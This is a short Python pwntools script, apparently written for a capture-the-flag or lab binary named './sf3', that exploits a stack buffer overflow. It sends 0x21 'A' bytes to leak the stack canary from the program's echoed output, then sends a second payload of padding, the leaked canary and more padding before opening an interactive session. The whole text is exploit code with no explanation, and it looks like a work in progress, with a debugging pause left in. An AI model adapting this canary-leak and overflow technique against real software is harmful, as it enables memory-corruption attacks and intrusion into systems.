from pwn import *

p = process("./sf3")

pay =b''
pay += b"A" * 0x21

p.sendafter("> ", pay)

p.recvuntil("A" * 0x20)
cannary = u32(p.recv(4)) - ord('A')
print("cannary = "+hex(cannary))

input("stop0")

pay2 = b''
pay2 += b"B"*0x20
pay2 += p32(cannary)
pay2 += b"B" * 0x20

p.sendline(pay2) 


p.interactive()
